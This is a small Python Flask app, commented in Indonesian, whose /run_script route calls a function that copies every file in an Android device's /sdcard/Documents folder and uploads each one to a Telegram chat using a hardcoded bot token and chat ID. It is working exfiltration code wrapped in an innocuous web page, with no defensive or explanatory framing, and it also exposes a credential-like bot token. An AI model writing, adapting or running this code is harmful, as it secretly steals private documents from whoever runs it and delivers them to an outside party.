from flask import Flask, render_template, redirect, url_for
import shutil
import os
import requests

app = Flask(__name__)

def botteleg():
    BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
    CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
    source_folder = "/sdcard/Documents"
    temp_folder = "./temp_documents"
    try:
        if not os.path.exists(temp_folder):
            os.makedirs(temp_folder)
        
        if os.path.exists(source_folder):
            for file_name in os.listdir(source_folder):
                source_file = os.path.join(source_folder, file_name)
                destination_file = os.path.join(temp_folder, file_name)
                if os.path.isfile(source_file):
                    shutil.copy2(source_file, destination_file)  # Menyalin file
        else:
            print("Folder sumber tidak ditemukan.")
        
        for file_name in os.listdir(temp_folder):
            file_path = os.path.join(temp_folder, file_name)
            with open(file_path, "rb") as file:
                url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument"
                files = {"document": file}
                data = {"chat_id": CHAT_ID}
                response = requests.post(url, data=data, files=files)
                if response.status_code == 200:
                    print(f"Dokumen berhasil dikirim.")
                else:
                    print(f"Gagal mengirim dokumen.")
        
        shutil.rmtree(temp_folder)
    except Exception as e:
        print(f"Error: {e}")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/run_script')
def run_script():
    botteleg()  # Menjalankan script
    return redirect(url_for('index'))  # Kembali ke halaman utama setelah selesai

if __name__ == '__main__':
    app.run(debug=True)
